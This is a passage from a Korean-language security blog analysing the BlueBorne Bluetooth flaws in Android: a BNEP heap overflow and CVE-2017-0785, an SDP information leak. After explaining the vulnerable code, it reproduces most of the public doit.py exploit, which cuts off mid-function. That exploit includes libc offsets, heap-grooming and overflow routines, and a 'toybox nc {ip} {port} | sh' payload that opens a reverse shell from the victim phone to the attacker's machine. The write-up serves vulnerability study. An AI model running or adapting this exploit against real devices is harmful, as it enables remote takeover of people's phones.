<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Heap 영역 (확보된 공간)           실제 데이터 복사되는 영역</span><br><span class="line">+----------------------+       +----------------------+</span><br><span class="line">| 0x00000000           |       |                      |</span><br><span class="line">|        ...           |       |                      |</span><br><span class="line">| 0x00000007           |       |                      |</span><br><span class="line">+----------------------+       +----------------------+</span><br><span class="line">                               | 0x00000008           |</span><br><span class="line">                               |        ...           |</span><br><span class="line">                               | 0x0000000F           |</span><br><span class="line">                               +----------------------+</span><br></pre></td></tr></table></figure>

<p>이러한 코드의 오류점 때문에, 들어온 BNEP 제어 메시지를 컨트롤하는 코드를 호출할 때마다 버퍼 오버 플로우가 발생한다. </p>
<ol start="3">
<li><p><strong>코드 취약점을 이용한 추가 공격</strong></p>
<ol>
<li><code>rem_len</code> : 패킷 내의 파싱을 기다리는 바이트들의 길이이므로, 공격자가 컨트롤 가능하다. </li>
<li>공격자가 조작한 BNEP 커넥션 패킷의 예시 :</li>
</ol>
<p> <img src="/images/3104_250617_image6.png" alt="그림 6. 공격자 조작 패킷"><br> <center>그림 6. [공격자 조작 패킷]<br></center><br></p>
<pre><code> | 필드명       | 값      | 의미                                                                 |
 |--------------|---------|----------------------------------------------------------------------|
 | `type`       | `0x81`  | `0x80` (extension bit set) + `0x01` (BNEP_FRAME_CONTROL)             |
 | `ctrl_type`  | `0x01`  | `BNEP_SETUP_CONNECTION_REQUEST_MSG`                                  |
 | `len`        | `0x00`  | 이 메시지의 길이 = 0 → `rem_len`도 0이 됨                            |
 | `payload`    | 8바이트 | `&#39;A&#39;` (0x41) 문자로 채움 (overflow payload)                          |
</code></pre>
<ol start="3">
<li>공격 원리<ul>
<li>메시지 길이가 0이어도 <code>bnep_process_control_packet()</code>는 통과될 수 있음.</li>
<li><code>osi_malloc(rem_len)</code> 에서 0바이트만큼 힙을 할당.</li>
<li>이후 <code>memcpy(p_pending_data + 1, p, rem_len);</code><ul>
<li>rem_len : 0이지만, 애당초 첫 제어 메시지를 처리하는 동안 ‘남은 바이트’를 저장해 두기 위한 코드였으므로, 실제로는 패킷 내 남은 전체 길이(payload)로 재계산된 rem_len이 사용된다.<br>  -&gt; 즉, 공격자가 원하는 크기만큼 memcpy 가능.</li>
</ul>
</li>
</ul>
</li>
</ol>
</li>
</ol>
<hr>
<h2 id="CVE-2017-0785"><a href="#CVE-2017-0785" class="headerlink" title="CVE-2017-0785"></a>CVE-2017-0785</h2><p>CVE-2017-0785는 SDP 레이어에서 발생한 취약점이다. </p>
<h3 id="SDP란"><a href="#SDP란" class="headerlink" title="SDP란?"></a>SDP란?</h3><p>SDP(Service Discovery Protocol)은 블루투스의 코어 레이어로, 모든 스택의 일부를 차지하고 있다. </p>
<ul>
<li><strong>주요 기능</strong><ul>
<li><strong>상대 블루투스 디바이스에서 지원하는 서비스를 알고자 할 때 사용한다.</strong><ul>
<li>SDP 클라이언트 -&gt; SDP 서버 : 검색 리퀘스트</li>
<li>SDP 서버 -&gt; SDP 클라이언트 : 리퀘스트 응답 (서비스 발견)</li>
</ul>
</li>
</ul>
</li>
<li>부가 기능<ul>
<li>블루투스의 고정된 UUID를 동적으로 바꿀 수 있는 PSM 으로 변환<ul>
<li>UUID : 범용 고유 식별자. 소프트웨어 구축에 쓰이는 식별자 표준.</li>
<li>PSM : L2CAP와 같은 블루투스 프로토콜이 하나의 채널에 들어오는 여러개의 데이터 스트림을 관리하기 위해 사용하는 메카니즘.  포트 넘버의 개념.</li>
</ul>
</li>
<li>검색된 PSM는 발견된 서비스와 L2CAP 연결을 형성하는데 사용된다.</li>
</ul>
</li>
</ul>
<h3 id="SDP-단편화"><a href="#SDP-단편화" class="headerlink" title="SDP 단편화"></a>SDP 단편화</h3><p>앞서 말했듯 SDP 서비스 검색은 서버와 클라이언트 간의 통신으로 진행되는데, 서버와 클라이언트 양측은 통신에서 사용할 수 있는 응답의 최대 크기(MTU)를 사전에 정해 놓는다.<br>응답이 이 “MTU”보다 클 경우를 대비해 만들어진 것이 “SDP Continuation, 즉 SDP 단편화 매커니즘이다. </p>
<ul>
<li>SDP 단편화 매커니즘<ol>
<li>SDP 클라이언트 SDP 리퀘스트 발송</li>
<li>요청에 대한 응답이 설정된 L2CAP 연결의 <strong>MTU를 초과</strong>하는 경우, <strong>응답의 일부</strong>가 반환되고 “continuation state” 구조가 SDP 응답에 추가된다. </li>
<li>응답의 나머지를 받기 위해, SDP 클라이언트는 같은 요청을 한번 더 보내며 마지막 응답에서 수신한 “continuation state”를 유지한다. (이러한 요청은 계속 요청이라 불린다.)</li>
<li>SDP 서버가 나머지 응답을 보낸다.</li>
<li>해당 과정은 응답의 모든 조각들이 서버→클라이언트에게 전달할 때까지 반복된다.</li>
</ol>
</li>
</ul>
<h3 id="SDP-설계-결정의-함정"><a href="#SDP-설계-결정의-함정" class="headerlink" title="SDP 설계 결정의 함정"></a>SDP 설계 결정의 함정</h3><p>SDP 아래 계층엔 이미 두 개의 단편화 계층이 존재</p>
<ul>
<li>L2CAP(세그먼테이션), ACL</li>
<li>그런데 굳이 SDP에게도 단편화 기능이 있어야 할 이유가?</li>
</ul>
<p>SDP continuation 메커니즘에서 continuation state의 구체적인 구조가 구현자에게 맡겨져 있다.</p>
<ul>
<li>continuation state : 클라이언트가 서버로부터 한번에 다 받지 못 한 SDP 응답을 이어서 받을 때 사용하는 <strong>연결된 상태 정보.</strong><ul>
<li><p>서버가 “아직 다 안 보냈어”라는 뜻으로 포함한 CONTINUATION STATE를 클라리언트는 무조건 다시 돌려보내기만 하고, 내용을 확인하지는 않아도 된다는 이야기인 듯</p>
</li>
<li><p>비판 : 어차피 서버만 해석하고 사용하는 정보인데, 이걸 외부로 노출해서 클라이언트가 보관하고 다시 보내도록 만드는 구조가 비정상적</p>
<p>  → <strong>continuation state 악용 가능.</strong></p>
<p>  : 서버가 클라이언트에게 데이터를 주고, 클라이언트가 이걸 반사하면 <strong>서버가 신뢰해서 처리하기 때문에</strong> 악용 가능하다!</p>
</li>
</ul>
</li>
</ul>
<h3 id="코드-해설"><a href="#코드-해설" class="headerlink" title="코드 해설"></a>코드 해설</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	<span class="type">uint16_t</span> cont_offset;</span><br><span class="line"></span><br><span class="line">&#125; <span class="type">sdp_cont_state_t</span>;```</span><br><span class="line"></span><br><span class="line">안드로이드 SDP 서버의 continuation state 구조체 정의.</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line"><span class="comment">/* Check if this is a continuation request */</span></span><br><span class="line"><span class="keyword">if</span> (*p_req) &#123;</span><br><span class="line"><span class="comment">//*P_req: 클라이언트 리퀘스트 </span></span><br><span class="line">...</span><br><span class="line">	<span class="keyword">if</span> (cont_offset != p_ccb-&gt;cont_offset) &#123;</span><br><span class="line">		sdpu_build_n_send_error(p_ccb, trans_num, SDP_INVALID_CONT_STATE,</span><br><span class="line">	SDP_TEXT_BAD_CONT_INX);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line">	rem_handles =</span><br><span class="line">		num_rsp_handles - cont_offset; <span class="comment">/* extract the remaining handles */</span></span><br><span class="line">		<span class="comment">/*남은 핸들 수를 추출한다.*/</span></span><br><span class="line">&#125; ...</span><br><span class="line"><span class="comment">/* Calculate how many handles will fit in one PDU */</span></span><br><span class="line"><span class="comment">/*한 번에 보낼 수 있는 최대 핸들 수를 계산한다.*/</span></span><br><span class="line">	cur_handles =</span><br><span class="line">		(<span class="type">uint16_t</span>)((p_ccb-&gt;rem_mtu_size - SDP_MAX_SERVICE_RSPHDR_LEN) / <span class="number">4</span>);</span><br><span class="line">	<span class="keyword">if</span> (rem_handles &lt;= cur_handles)</span><br><span class="line">		cur_handles = rem_handles;</span><br><span class="line">	<span class="keyword">else</span> <span class="comment">/* Continuation is set */</span></span><br><span class="line">&#123;</span><br><span class="line">	p_ccb-&gt;cont_offset += cur_handles;</span><br><span class="line">	is_cont = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">for</span> (xx = cont_offset; xx &lt; cont_offset + cur_handles; xx++)</span><br><span class="line">	UINT32_TO_BE_STREAM(p_rsp, rsp_handles[xx]);</span><br></pre></td></tr></table></figure>


<h3 id="내용-정리-그림"><a href="#내용-정리-그림" class="headerlink" title="내용 정리(그림)"></a>내용 정리(그림)</h3><p>SDP의 이론과 코드 취약점 발생의 원리를 아래 그림으로 정리했다. </p>
<p><img src="/images/3104_250617_image7.png" alt="그림 7. SDP 정리"></p>
<center>그림 7. [SDP 정리]<br></center><br>


<hr>
<h1 id="POC-코드-분석"><a href="#POC-코드-분석" class="headerlink" title="POC 코드 분석."></a>POC 코드 분석.</h1><p>이제 두 개의 취약점을 모두 확인해 보았으니, 해당 취약점들을 이용하여 안드로이드를 공격하는 POC 코드를 분석해 보도록 하자. </p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FybWlzU2VjdXJpdHkvYmx1ZWJvcm5lL2Jsb2IvbWFzdGVyL2FuZHJvaWQvZG9pdC5weQ==">https://github.com/ArmisSecurity/blueborne/blob/master/android/doit.py</span></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ArmisSecurity/blueborn/android/doit.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> select</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> bluetooth</span><br><span class="line"><span class="keyword">from</span> bluetooth <span class="keyword">import</span> _bluetooth <span class="keyword">as</span> bt</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> bluedroid</span><br><span class="line"><span class="keyword">import</span> connectback</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> log</span><br><span class="line"></span><br><span class="line"><span class="comment"># Listening TCP ports that need to be opened on the attacker machine</span></span><br><span class="line"><span class="comment"># 공격자 기기에서 개방되어야 할 tcp 포트들 나열</span></span><br><span class="line">NC_PORT = <span class="number">1233</span></span><br><span class="line">STDOUT_PORT = <span class="number">1234</span></span><br><span class="line">STDIN_PORT = <span class="number">1235</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit offsets work for these (exact) libs:</span></span><br><span class="line"><span class="comment">#공격용 offsets 들은 아래의 라이브러리들에서만 작동한다 : (라이브러리 미리 다운받아놔야 함)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bullhead:/ # sha1sum /system/lib/hw/bluetooth.default.so</span></span><br><span class="line"><span class="comment"># 8a89cadfe96c0f79cdceee26c29aaf23e3d07a26  /system/lib/hw/bluetooth.default.so</span></span><br><span class="line"><span class="comment"># bullhead:/ # sha1sum /system/lib/libc.so</span></span><br><span class="line"><span class="comment"># 0b5396cd15a60b4076dacced9df773f75482f537  /system/lib/libc.so</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># For Pixel 7.1.2 patch level Aug/July 2017</span></span><br><span class="line">LIBC_TEXT_STSTEM_OFFSET = <span class="number">0x45f80</span> + <span class="number">1</span> - <span class="number">56</span> <span class="comment"># system + 1</span></span><br><span class="line">LIBC_SOME_BLX_OFFSET = <span class="number">0x1a420</span> + <span class="number">1</span> - <span class="number">608</span> <span class="comment"># eventfd_write + 28 + 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># For Nexus 5X 7.1.2 patch level Aug/July 2017</span></span><br><span class="line"><span class="comment">#LIBC_TEXT_STSTEM_OFFSET = 0x45f80 + 1</span></span><br><span class="line"><span class="comment">#LIBC_SOME_BLX_OFFSET = 0x1a420 + 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Aligned to 4 inside the name on the bss (same for both supported phones)</span></span><br><span class="line">BSS_ACL_REMOTE_NAME_OFFSET = <span class="number">0x202ee4</span></span><br><span class="line">BLUETOOTH_BSS_SOME_VAR_OFFSET = <span class="number">0x14b244</span></span><br><span class="line"></span><br><span class="line">MAX_BT_NAME = <span class="number">0xf5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Payload details (attacker IP should be accessible over the internet for the victim phone)</span></span><br><span class="line">SHELL_SCRIPT = <span class="string">b&#x27;toybox nc &#123;ip&#125; &#123;port&#125; | sh&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PWNING_TIMEOUT = <span class="number">3</span></span><br><span class="line">BNEP_PSM = <span class="number">15</span></span><br><span class="line">PWN_ATTEMPTS = <span class="number">10</span></span><br><span class="line">LEAK_ATTEMPTS = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_bt_name</span>(<span class="params">payload, src_hci, src, dst</span>):</span><br><span class="line"><span class="comment">#블루투스_이름_설정. </span></span><br><span class="line"><span class="comment"># hci : </span></span><br><span class="line"></span><br><span class="line">	 <span class="comment"># Create raw HCI sock to set our BT name</span></span><br><span class="line">	 </span><br><span class="line">    raw_sock = bt.hci_open_dev(bt.hci_devid(src_hci))</span><br><span class="line">    flt = bt.hci_filter_new()</span><br><span class="line">    bt.hci_filter_all_ptypes(flt)</span><br><span class="line">    bt.hci_filter_all_events(flt)</span><br><span class="line">    raw_sock.setsockopt(bt.SOL_HCI, bt.HCI_FILTER, flt)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Send raw HCI command to our controller to change the BT name (first 3 bytes are padding for alignment)</span></span><br><span class="line">    raw_sock.sendall(binascii.unhexlify(<span class="string">&#x27;01130cf8cccccc&#x27;</span>) + payload.ljust(MAX_BT_NAME, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    raw_sock.close()</span><br><span class="line">    <span class="comment">#time.sleep(1)</span></span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Connect to BNEP to &quot;refresh&quot; the name (does auth)</span></span><br><span class="line">    bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)</span><br><span class="line">    bnep.bind((src, <span class="number">0</span>))</span><br><span class="line">    bnep.connect((dst, BNEP_PSM))</span><br><span class="line">    bnep.close()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Close ACL connection</span></span><br><span class="line">    os.system(<span class="string">&#x27;hcitool dc %s&#x27;</span> % (dst,))</span><br><span class="line">    <span class="comment">#time.sleep(1)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_rand_bdaddr</span>(<span class="params">src_hci</span>):</span><br><span class="line">    addr = [<span class="string">&#x27;%02x&#x27;</span> % (<span class="built_in">ord</span>(c),) <span class="keyword">for</span> c <span class="keyword">in</span> os.urandom(<span class="number">6</span>)]</span><br><span class="line">    <span class="comment"># NOTW: works only with CSR bluetooth adapters!</span></span><br><span class="line">    os.system(<span class="string">&#x27;sudo bccmd -d %s psset -r bdaddr 0x%s 0x00 0x%s 0x%s 0x%s 0x00 0x%s 0x%s&#x27;</span> %</span><br><span class="line">              (src_hci, addr[<span class="number">3</span>], addr[<span class="number">5</span>], addr[<span class="number">4</span>], addr[<span class="number">2</span>], addr[<span class="number">1</span>], addr[<span class="number">0</span>]))</span><br><span class="line">    final_addr = <span class="string">&#x27;:&#x27;</span>.join(addr)</span><br><span class="line">    log.info(<span class="string">&#x27;Set %s to new rand BDADDR %s&#x27;</span> % (src_hci, final_addr))</span><br><span class="line">    <span class="comment">#time.sleep(1)</span></span><br><span class="line">    <span class="keyword">while</span> bt.hci_devid(final_addr) &lt; <span class="number">0</span>:</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">return</span> final_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">memory_leak_get_bases</span>(<span class="params">src, src_hci, dst</span>):</span><br><span class="line">    prog = log.progress(<span class="string">&#x27;Doing stack memory leak...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Get leaked stack data. This memory leak gets &quot;deterministic&quot; &quot;garbage&quot; from the stack.</span></span><br><span class="line">    result = bluedroid.do_sdp_info_leak(dst, src)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Calculate according to known libc.so and bluetooth.default.so binaries</span></span><br><span class="line">    likely_some_libc_blx_offset = result[-<span class="number">3</span>][-<span class="number">2</span>]</span><br><span class="line">    likely_some_bluetooth_default_global_var_offset = result[<span class="number">6</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    libc_text_base = likely_some_libc_blx_offset - LIBC_SOME_BLX_OFFSET</span><br><span class="line">    bluetooth_default_bss_base = likely_some_bluetooth_default_global_var_offset - BLUETOOTH_BSS_SOME_VAR_OFFSET</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&#x27;libc_base: 0x%08x, bss_base: 0x%08x&#x27;</span> % (libc_text_base, bluetooth_default_bss_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Close SDP ACL connection</span></span><br><span class="line">    os.system(<span class="string">&#x27;hcitool dc %s&#x27;</span> % (dst,))</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">    prog.success()</span><br><span class="line">    <span class="keyword">return</span> libc_text_base, bluetooth_default_bss_base</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">src_hci, dst, bluetooth_default_bss_base, system_addr, acl_name_addr, my_ip, libc_text_base</span>):</span><br><span class="line">    <span class="comment"># Gen new BDADDR, so that the new BT name will be cached</span></span><br><span class="line">    src = set_rand_bdaddr(src_hci)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Payload is: &#x27;&quot;\x17AAAAAAsysm&quot;;\n&lt;bash_commands&gt;\n#&#x27;</span></span><br><span class="line">    <span class="comment"># &#x27;sysm&#x27; is the address of system() from libc. The *whole* payload is a shell script.</span></span><br><span class="line">    <span class="comment"># 0x1700 == (0x1722 &amp; 0xff00) is the &quot;event&quot; of a &quot;HORRIBLE_HACK&quot; message.</span></span><br><span class="line">    payload = struct.pack(<span class="string">&#x27;&lt;III&#x27;</span>, <span class="number">0xAAAA1722</span>, <span class="number">0x41414141</span>, system_addr) + <span class="string">b&#x27;&quot;;\n&#x27;</span> + \</span><br><span class="line">                          SHELL_SCRIPT.<span class="built_in">format</span>(ip=my_ip, port=NC_PORT) + <span class="string">b&#x27;\n#&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(payload) &lt; MAX_BT_NAME</span><br><span class="line">    <span class="keyword">assert</span> <span class="string">b&#x27;\x00&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> payload</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Puts payload into a known bss location (once we create a BNEP connection).</span></span><br><span class="line">    set_bt_name(payload, src_hci, src, dst)</span><br><span class="line"></span><br><span class="line">    prog = log.progress(<span class="string">&#x27;Connecting to BNEP again&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)</span><br><span class="line">    bnep.bind((src, <span class="number">0</span>))</span><br><span class="line">    bnep.connect((dst, BNEP_PSM))</span><br><span class="line"></span><br><span class="line">    prog.success()</span><br><span class="line">    prog = log.progress(<span class="string">&#x27;Pwning...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Each of these messages causes BNEP code to send 100 &quot;command not understood&quot; responses.</span></span><br><span class="line">    <span class="comment"># This causes list_node_t allocations on the heap (one per reponse) as items in the xmit_hold_q.</span></span><br><span class="line">    <span class="comment"># These items are popped asynchronously to the arrival of our incoming messages (into hci_msg_q).</span></span><br><span class="line">    <span class="comment"># Thus &quot;holes&quot; are created on the heap, allowing us to overflow a yet unhandled list_node of hci_msg_q.</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        bnep.send(binascii.unhexlify(<span class="string">&#x27;8109&#x27;</span> + <span class="string">&#x27;800109&#x27;</span> * <span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Repeatedly trigger the vuln (overflow of 8 bytes) after an 8 byte size heap buffer.</span></span><br><span class="line">    <span class="comment"># This is highly likely to fully overflow over instances of &quot;list_node_t&quot; which is exactly</span></span><br><span class="line">    <span class="comment"># 8 bytes long (and is *constantly* used/allocated/freed on the heap).</span></span><br><span class="line">    <span class="comment"># Eventually one overflow causes a call to happen to &quot;btu_hci_msg_process&quot; with &quot;p_msg&quot;</span></span><br><span class="line">    <span class="comment"># under our control. (&quot;btu_hci_msg_process&quot; is called *constantly* with messages out of a list)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        <span class="comment"># If we&#x27;re blocking here, the daemon has crashed</span></span><br><span class="line">        _, writeable, _ = select.select([], [bnep], [], PWNING_TIMEOUT)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> writeable:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        bnep.send(binascii.unhexlify(<span class="string">&#x27;810100&#x27;</span>) +</span><br><span class="line">                  struct.pack(<span class="string">&#x27;&lt;II&#x27;</span>, <span class="number">0</span>, acl_name_addr))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log.info(<span class="string">&quot;Looks like it didn&#x27;t crash. Possibly worked&quot;</span>)</span><br><span class="line"></span><br><span class="line">    prog.success()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">src_hci, dst, my_ip</span>):</span><br><span class="line">    os.system(<span class="string">&#x27;hciconfig %s sspmode 0&#x27;</span> % (src_hci,))</span><br><span class="line">    os.system(<span class="string">&#x27;hcitool dc %s&#x27;</span> % (dst,))</span><br><span class="line"></span><br><span class="line">    sh_s, stdin, stdout = connectback.create_sockets(NC_PORT, STDIN_PORT, STDOUT_PORT)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(PWN_ATTEMPTS):</span><br><span class="line">        log.info(<span class="string">&#x27;Pwn attempt %d:&#x27;</span> % (i,))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Create a new BDADDR</span></span><br><span class="line">        src = set_rand_bdaddr(src_hci)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Try to leak section bases</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(LEAK_ATTEMPTS):</span><br><span class="line">            libc_text_base, bluetooth_default_bss_base = memory_leak_get_bases(src, src_hci, dst)</span><br><span class="line">            <span class="keyword">if</span> (libc_text_base &amp; <span class="number">0xfff</span> == <span class="number">0</span>) <span class="keyword">and</span> (bluetooth_default_bss_base &amp; <span class="number">0xfff</span> == <span class="number">0</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">           <span class="keyword">assert</span> <span class="literal">False</span>, <span class="string">&quot;Memory doesn&#x27;t seem to have leaked as expected. Wrong .so versions?&quot;</span></span><br><span class="line"></span><br><span class="line">        system_addr = LIBC_TEXT_STSTEM_OFFSET + libc_text_base</span><br><span class="line">        acl_name_addr = BSS_ACL_REMOTE_NAME_OFFSET + bluetooth_default_bss_base</span><br><span class="line">        <span class="keyword">assert</span> acl_name_addr % <span class="number">4</span> == <span class="number">0</span></span><br><span class="line">        log.info(<span class="string">&#x27;system: 0x%08x, acl_name: 0x%08x&#x27;</span> % (system_addr, acl_name_addr))</span><br><span class="line"></span><br><span class="line">        pwn(src_hci, dst, 